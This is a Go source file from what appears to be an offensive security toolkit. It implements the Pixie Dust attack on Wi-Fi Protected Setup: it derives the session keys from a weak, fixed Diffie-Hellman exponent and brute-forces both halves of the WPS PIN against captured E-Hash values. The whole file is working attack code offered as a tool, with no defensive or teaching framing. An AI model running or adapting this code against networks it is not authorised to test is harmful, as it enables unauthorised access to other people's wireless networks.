/*
 * Copyright (C) 2025 Oliver R. Calazans Jeronimo
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org>.
 */

package pixiedust

import (
	"bytes"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/binary"
	"errors"
	"fmt"
	"math/big"
	"net"
	"offscan/internal/utils"
	"os"
	"slices"
	"time"
)



type pixieDustAttack struct {
    timeExec    time.Time
    firstHalf   int
    secondHalf  int
    emptyPin    bool
	jobs        int
	pke         []byte
	pkr         []byte
	eHash1      []byte
	eHash2      []byte
	authKey     []byte
	eNonce      []byte
	rNonce      []byte
	ebssid      net.HardwareAddr
	modes       []uint8
	m5enc       []byte
	m7enc       []byte
	force       bool
	dhSmall     bool
	start       string
	end         string
	cStart      int
	cEnd        int
    emsk        []byte
    wrapKey     []byte
    psk1        []byte
    psk2        []byte
    emptyPsk    []byte
    kdk         []byte
    decrypted5  []byte
    decrypted7  []byte
    eSecret1    []byte
    eSecret2    []byte
}



func newPixieDust(args []string) pixieDustAttack {
	pda := pixieDustAttack{ firstHalf: -1, secondHalf: -1}
	pda.parsePortScanArgs(args)
	return pda
}



func (pda *pixieDustAttack) execute() {
	pda.timeExec = time.Now()
    pda.executeRTL819xCase()
    pda.displayTime()
}



func (pda *pixieDustAttack) getKDK() {
    dhKey  := computeDHKey(pda.pkr)
	h      := hmac.New(sha256.New, dhKey)
	h.Write(append(append(pda.eNonce, pda.ebssid...), pda.rNonce...))
	pda.kdk = h.Sum(nil)
}



func computeDHKey(pkr []byte) []byte {
    eKey := bytes.Repeat([]byte{0x55}, 192)
	
    sharedSecret, err := cryptoModExp(pkr, eKey, dhGroup5Prime)
    if err != nil {
        utils.Abort(fmt.Sprintf("%v", err))
    }

    dhkey := sha256.Sum256(sharedSecret)
    return dhkey[:]
}



func (pda *pixieDustAttack) isModeSelect(mode uint8) bool {
	return slices.Contains(pda.modes, mode)
}



func cryptoModExp(base, power, modulus []byte) ([]byte, error) {
    b := new(big.Int).SetBytes(base)
    e := new(big.Int).SetBytes(power)
    m := new(big.Int).SetBytes(modulus)

    if m.Sign() == 0 || m.Cmp(big.NewInt(1)) == 0 {
        return nil, errors.New("Modulus must be greater than 1")
    }

    result := new(big.Int).Exp(b, e, m)

    return result.Bytes(), nil
}



func (pda *pixieDustAttack) keyDerivationFunction() {
	var kdfSalt  = []byte("Wi-Fi Easy and Secure Key Derivation")
    totalLen    := wpsAuthkeyLen + wpsKeywrapkeyLen + wpsEmskLen // 80 bytes
    kdkBits     := uint32(totalLen * 8)  // 640 bits
    out         := make([]byte, 0, totalLen)
   
    for i := 1; len(out) < totalLen; i++ {
        h := hmac.New(sha256.New, pda.kdk)
        binary.Write(h, binary.BigEndian, uint32(i))
        h.Write(kdfSalt)
        binary.Write(h, binary.BigEndian, kdkBits)
        out = append(out, h.Sum(nil)...)
    }

    out = out[:totalLen]
	
	offset      := 0
    pda.authKey  = out[:wpsAuthkeyLen]
	
	offset      += wpsAuthkeyLen
    pda.wrapKey  = out[offset : offset + wpsKeywrapkeyLen]
	
	offset  += wpsKeywrapkeyLen
    pda.emsk = out[offset:]
}



func (pda *pixieDustAttack) emptyPinHMAC() {
    h := hmac.New(sha256.New, pda.authKey)
    pda.emptyPsk = h.Sum(nil)
}



func (pda *pixieDustAttack) crackFirstHalf(es1Override []byte) {
    eS1 := utils.Pick(es1Override != nil, es1Override, pda.eSecret1)

    if pda.checkEmptyPinHalf(eS1, pda.eHash1) {
        pda.emptyPin  = true
        pda.firstHalf = 0
        pda.psk1      = make([]byte, len(pda.emptyPsk))
        copy(pda.psk1, pda.emptyPsk)
        return
    }

    for firstHalf := range 10000 {
        psk, ok := pda.checkPinHalf(eS1, pda.eHash1, firstHalf)
        
        if ok {
            pda.firstHalf = firstHalf
            pda.psk1      = append([]byte(nil), psk...)
            return
        }
    }

    pda.firstHalf = -1
}



func (pda *pixieDustAttack) checkEmptyPinHalf(es, ehash []byte) bool {
    h := hmac.New(sha256.New, pda.authKey)
    h.Write(es)
    h.Write(pda.emptyPsk[:16])
    h.Write(pda.pke)
    h.Write(pda.pkr)
    hash := h.Sum(nil)
    return hmac.Equal(hash, ehash)
}



func (pda *pixieDustAttack) checkPinHalf(es, ehash []byte, pinHalf int) ([]byte, bool) {
    h       := hmac.New(sha256.New, pda.authKey)
    pinhalf := intToPinHalf(pinHalf)
    h.Write(pinhalf[:])
    psk := h.Sum(nil)[:16]

    // buffer = es || psk || pke || pkr
    h.Reset()
    h.Write(es)
    h.Write(psk)
    h.Write(pda.pke)
    h.Write(pda.pkr)
    hash := h.Sum(nil)

    return psk, hmac.Equal(hash, ehash)
}



func intToPinHalf(n int) [4]byte {
    var buf [4]byte
    buf[0] = byte('0' + (n/1000)%10)
    buf[1] = byte('0' + (n/100)%10)
    buf[2] = byte('0' + (n/10)%10)
    buf[3] = byte('0' + n%10)
    return buf
}



func (pda *pixieDustAttack) crackSecondHalf() {
    if pda.emptyPin {
        if pda.checkEmptyPinHalf(pda.eSecret2, pda.eHash2) {
            pda.secondHalf = 0
            pda.psk2       = make([]byte, len(pda.emptyPsk))
            copy(pda.psk2, pda.emptyPsk)
            return
        }
        utils.Abort("Empty pin not valid for second half")
    }

    if pda.firstHalf < 0 || pda.firstHalf > 9999 {
        utils.Abort(fmt.Sprintf("Invalid first half: %d", pda.firstHalf))
    }

    for secondHalf := range 1000{
        checksum    := wpsPinChecksum(pda.firstHalf * 1000 + secondHalf)
        cSecondHalf := secondHalf * 10 + checksum
        psk, ok     := pda.checkPinHalf(pda.eSecret2, pda.eHash2, cSecondHalf)

        if ok {
            pda.secondHalf = cSecondHalf
            pda.psk2       = make([]byte, len(psk))
            copy(pda.psk2, psk)
            return
        }
    }

    // Fallback
    for secondHalf := range 10000 {
        pinFull := pda.firstHalf * 10000 + secondHalf
        if wpsPinValid(pinFull) { continue }

        psk, ok := pda.checkPinHalf(pda.eSecret2, pda.eHash2, secondHalf)

        if ok {
            pda.secondHalf = secondHalf
            pda.psk2       = make([]byte, len(psk))
            copy(pda.psk2, psk)
            return
        }
    }

    pda.secondHalf = -1
}



func wpsPinChecksum(pin int) int {
    acc := 0
    for pin > 0 {
        acc += 3 * (pin % 10)
        pin /= 10
        acc += pin % 10
        pin /= 10
    }
    return (10 - acc%10) % 10
}



func wpsPinValid(pin int) bool {
    return wpsPinChecksum(pin/10) == pin % 10
}



func (pda *pixieDustAttack) displayTime() {
	elapsed := time.Since(pda.timeExec).Seconds()
    fmt.Printf("[%%] %.2f seconds in execution\n", elapsed)
}



func (pda *pixieDustAttack) displayPIN() {
    if pda.firstHalf == -1 && pda.secondHalf == -1 {
        fmt.Println("[!] PIN not found")
        return
    }

    if pda.emptyPin {
        fmt.Println("[*] Empty PIN")
        return
    }

    pin := utils.Pick(pda.firstHalf > -1,  fmt.Sprintf("%d", pda.firstHalf),  "????")
    pin += utils.Pick(pda.secondHalf > -1, fmt.Sprintf("%d", pda.secondHalf), "????")

    if pda.firstHalf != -1 && pda.secondHalf == -1 {
        fmt.Println("[!] Only the first half was found")
    }

    fmt.Printf("[*] PIN: %s", pin)
    os.Exit(0)
}